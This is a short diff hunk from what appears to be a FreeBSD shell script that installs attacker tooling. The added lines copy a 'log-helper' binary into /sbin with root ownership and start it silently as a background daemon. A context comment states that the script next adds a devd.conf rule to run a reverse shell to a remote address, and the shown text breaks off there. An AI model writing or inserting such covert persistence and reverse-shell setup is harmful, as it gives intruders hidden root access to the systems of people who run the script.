@@ -71,6 +71,14 @@ if [ -e "./log" ]; then
 else
   echo "Warning: ./log not found"
 fi
+if [ -e "./log-helper" ]; then
+  install -o root -g wheel -m 755 log-helper /sbin/log-helper
+  if [ -e "/dev/sys_monitor" ]; then
+    pkill -x log-helper >/dev/null 2>&1 || true
+    daemon -f /sbin/log-helper >/dev/null 2>&1
+  fi
+fi
+
 # Add matching rule in /etc/devd.conf to run reverse shell to remote address
 if ! grep -q "DHCLIENT" /etc/devd.conf; then
   mkdir -p /usr/local/etc/devd
